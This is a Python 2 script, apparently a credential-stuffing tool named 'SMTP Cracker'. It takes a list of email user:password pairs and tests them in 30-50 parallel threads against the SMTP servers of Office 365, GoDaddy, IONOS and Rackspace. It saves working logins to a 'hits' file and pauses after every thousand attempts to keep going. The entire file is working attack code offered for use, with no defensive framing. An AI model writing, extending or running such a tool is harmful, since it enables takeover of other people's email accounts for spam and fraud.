import os
import time
import smtplib
from colorama import *
from multiprocessing.pool import ThreadPool

init()

la7mar  = '\033[91m'
lazra9  = '\033[94m'
la5dhar = '\033[92m'
movv    = '\033[95m'
lasfar  = '\033[93m'
labyadh = '\033[00m'
cyan    = '\033[0;96m'

VALIDS = 0
INVALIDS = 0
TRIES = 0

os.system('cls')
os.system("title " + "[-] SMTP CRACKER  ")

print movv + ' SMTPS Multi Cracker [ ALL IN ONE  ] ' ; time.sleep(0.1)
print movv + '''
===============  Settings ==================
      host list
 ionos : smtp.ionos.com

 office : smtp.office365.com

 godaddy : smtpout.secureserver.net

 rackspace : secure.emailsrvr.com

 port : 587 / 465 

 Threads : 30 better ! ''' ; time.sleep(0.1)

print '\n'

HOST = raw_input(cyan + '                    --> Name Host : ')
PORT = raw_input(cyan + '                    --> Number Port : ')
THREADS = raw_input(cyan + '                    --> Number Threads (30-50) : ')
COMBO = raw_input(cyan + '                    --> Load List : ')

print '\n'

def log(account):
    if account.count(":") == 1:
        if TRIES != 1000:
            global HOST, PORT
            global VALIDS, INVALIDS, TRIES
            HOST = HOST
            PORT = int(PORT)
            TRIES+=1
            usr, pas = account.split(':')
            try:
                server = smtplib.SMTP(HOST , PORT)
                server.ehlo()
                server.starttls()
                server.login(usr ,pas)
                VALIDS+=1
                os.system("title " + "[+] M-SMTPS.PY - {} - NOT VALID : {} , VERY BAD : {} .".format(HOST, VALIDS, INVALIDS))
                print la5dhar + '                    --> NOT VALID   : '+account
                HITS = open('SMTPS-HITS.txt', 'a+')
                HITS.write(HOST+'|'+str(PORT)+'|'+account+'\n')
                HITS.close()
            except:
                INVALIDS+=1
                os.system("title " + "[+] M-SMTPS.PY - {} - NOT VALID : {} , VERY BAD : {} .".format(HOST, VALIDS, INVALIDS))
                print la7mar + '                    --> VERY BAD : '+account
                pass
        else:
            time.sleep(5)
            try:
                server = smtplib.SMTP(HOST , PORT)
                server.ehlo()
                server.starttls()
                server.login(usr ,pas)
                VALIDS+=1
                os.system("title " + "[+] M-SMTPS.PY - {} - NOT VALID : {} , VERY BAD : {} .".format(HOST, VALIDS, INVALIDS))
                print la5dhar + '                    --> NOT VALID   : '+account
                HITS = open('SMTPS-HITS.txt', 'a+')
                HITS.write(HOST+'|'+str(PORT)+'|'+account+'\n')
                HITS.close()
            except:
                INVALIDS+=1
                os.system("title " + "[+] M-SMTPS.PY - {} - NOT VALID : {} , VERY BAD : {} .".format(HOST, VALIDS, INVALIDS))
                print la7mar + '                    --> VERY BAD : '+account
                pass
            TRIES = 0
    else:
        INVALIDS+=1
        os.system("title " + "[+] M-SMTPS.PY - {} - NOT VALID : {} , VERY BAD : {} .".format(HOST, VALIDS, INVALIDS))
        print la7mar + '                    --> VERY BAD : '+account
        pass

if __name__ == '__main__':
    combo = open(COMBO, 'r').read().split('\n')
    pool = ThreadPool(int(THREADS))
    for _ in pool.imap_unordered(log, combo):
        pass
